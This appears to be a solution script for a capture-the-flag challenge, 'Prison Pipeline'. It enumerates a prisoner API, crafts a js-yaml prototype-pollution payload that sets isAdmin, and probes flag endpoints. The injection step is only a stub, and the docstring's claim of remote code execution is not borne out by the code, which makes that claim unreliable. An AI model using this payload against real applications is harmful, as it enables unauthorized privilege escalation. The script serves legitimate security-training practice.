#!/usr/bin/env python3
"""
Prison Pipeline CTF Challenge - Solution Script

This script exploits YAML deserialization vulnerabilities in a multi-service
Node.js application to achieve remote code execution.

Target: Port 5000 (Application), Port 8080 (Prisoner-DB)
Category: Misc / Web
Vulnerability: YAML deserialization via js-yaml

Author: CTF Team
Date: 2025
"""

import requests
import json
import sys
import time

# Colors for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    """Print solution banner"""
    print("=" * 60)
    print(f"{Colors.HEADER}Prison Pipeline CTF Challenge - Exploit{Colors.ENDC}")
    print("=" * 60)
    print(f"Vulnerability: YAML Deserialization")
    print(f"Attack: Prototype Pollution → RCE")
    print("=" * 60)
    print()

def enumerate_prisoners(base_url):
    """
    Step 1: Enumerate existing prisoners
    
    Args:
        base_url (str): Base URL of the application
        
    Returns:
        list: List of prisoner IDs or None
    """
    print(f"{Colors.OKBLUE}[*] Step 1: Enumerating prisoners...{Colors.ENDC}")
    
    try:
        response = requests.get(f"{base_url}/api/prisoners", timeout=10)
        
        if response.status_code == 200:
            prisoners = response.json()
            print(f"{Colors.OKGREEN}[+] Found {len(prisoners)} prisoners{Colors.ENDC}")
            return prisoners
        else:
            print(f"{Colors.WARNING}[!] Unexpected status: {response.status_code}{Colors.ENDC}")
            return None
            
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error enumerating: {e}{Colors.ENDC}")
        return None

def craft_yaml_payload():
    """
    Step 2: Craft malicious YAML payload
    
    Returns:
        str: YAML payload for deserialization exploit
    """
    print(f"\n{Colors.OKBLUE}[*] Step 2: Crafting YAML payload...{Colors.ENDC}")
    
    # Prototype pollution payload to inject properties
    payload = """
prisoner_profile:
  __proto__:
    isAdmin: true
    polluted: "pwned"
  name: "Exploit User"
  id: "99999"
  crime: "Hacking"
"""
    
    print(f"{Colors.OKGREEN}[+] Payload crafted (Prototype Pollution){Colors.ENDC}")
    return payload

def inject_payload(base_url, payload):
    """
    Step 3: Inject malicious YAML payload
    
    Args:
        base_url (str): Base URL of the application
        payload (str): YAML payload to inject
        
    Returns:
        bool: True if successful, False otherwise
    """
    print(f"\n{Colors.OKBLUE}[*] Step 3: Injecting payload...{Colors.ENDC}")
    
    # This is a template - actual exploitation depends on API endpoints
    # You may need to:
    # 1. Create a new prisoner with malicious YAML
    # 2. Update existing prisoner data
    # 3. Upload file via multipart form
    
    print(f"{Colors.WARNING}[!] Injection method needs to be determined based on API{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Check for endpoints like:{Colors.ENDC}")
    print(f"    POST /api/prisoner")
    print(f"    PUT /api/prisoner/:id")
    print(f"    POST /upload")
    
    return False

def extract_flag(base_url):
    """
    Step 4: Extract the flag
    
    Args:
        base_url (str): Base URL of the application
        
    Returns:
        str: Flag or None
    """
    print(f"\n{Colors.OKBLUE}[*] Step 4: Attempting to extract flag...{Colors.ENDC}")
    
    # After successful exploitation, flag might be:
    # 1. In response body
    # 2. Accessible via /flag endpoint
    # 3. Written to accessible location
    
    try:
        # Try common flag endpoints
        endpoints = ['/flag', '/flag.txt', '/api/flag']
        
        for endpoint in endpoints:
            response = requests.get(f"{base_url}{endpoint}", timeout=5)
            if response.status_code == 200 and ('HTB{' in response.text or 'FLAG{' in response.text):
                return response.text.strip()
                
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error extracting flag: {e}{Colors.ENDC}")
    
    return None

def main():
    """Main exploitation flow"""
    print_banner()
    
    # Parse command line arguments
    if len(sys.argv) < 2:
        print(f"{Colors.WARNING}Usage: {sys.argv[0]} <target_host> [port]{Colors.ENDC}")
        print(f"Example: {sys.argv[0]} localhost")
        print(f"Example: {sys.argv[0]} target.htb 5000")
        sys.exit(1)
    
    host = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) > 2 else "5000"
    base_url = f"http://{host}:{port}"
    
    print(f"{Colors.OKCYAN}[*] Target: {base_url}{Colors.ENDC}\n")
    
    # Exploitation phases
    
    # Phase 1: Reconnaissance
    prisoners = enumerate_prisoners(base_url)
    
    # Phase 2: Craft payload
    payload = craft_yaml_payload()
    
    # Phase 3: Inject payload
    success = inject_payload(base_url, payload)
    
    # Phase 4: Extract flag
    flag = extract_flag(base_url)
    
    # Results
    print()
    print("=" * 60)
    
    if flag:
        print(f"{Colors.OKGREEN}{Colors.BOLD}[+] SUCCESS! Flag captured:{Colors.ENDC}")
        print(f"{Colors.OKGREEN}{Colors.BOLD}[+] {flag}{Colors.ENDC}")
        print("=" * 60)
        return 0
    else:
        print(f"{Colors.WARNING}[!] Exploit template - manual analysis required{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] This challenge requires:{Colors.ENDC}")
        print(f"    1. API endpoint discovery")
        print(f"    2. YAML payload injection method")
        print(f"    3. Command execution technique")
        print(f"    4. Flag extraction method")
        print()
        print(f"{Colors.OKBLUE}[*] Next steps:{Colors.ENDC}")
        print(f"    - Analyze API endpoints with: curl -X GET {base_url}/api/prisoners")
        print(f"    - Check for upload functionality")
        print(f"    - Test YAML deserialization")
        print(f"    - Review js-yaml version for CVEs")
        print("=" * 60)
        return 1

if __name__ == "__main__":
    sys.exit(main())
